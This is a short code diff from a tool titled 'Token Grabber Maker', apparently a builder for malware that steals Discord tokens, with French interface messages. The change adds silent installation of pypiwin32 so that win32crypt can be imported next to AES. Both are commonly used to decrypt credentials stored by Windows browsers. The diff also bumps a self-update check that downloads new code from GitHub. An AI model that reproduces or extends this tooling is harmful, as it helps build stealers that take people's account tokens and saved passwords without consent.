@@ -34,12 +34,16 @@ try:
     from Crypto.Cipher import AES
 except:
     os.system(f"{sys.executable} -m pip install pycryptodome")
+try:
+    import win32crypt
+except:
+    os.system(f"{sys.executable} -m pip install pypiwin32")
 
 
 def build():
     version = requests.get("https://raw.githubusercontent.com/IDRALOU/TokenGrabberMaker/main/Files/version")
     ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Version {version.text} | Créé par IDRALOU#6966")
-    if version.text != "1.0.7\n":
+    if version.text != "1.0.8\n":
         print("Une nouvelle version est disponible, le téléchargement est en cours.")
         ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Mise à jour en cours... | Créé par IDRALOU#6966")
         new_version = requests.get("https://github.com/IDRALOU/TokenGrabberMaker/archive/main.zip")
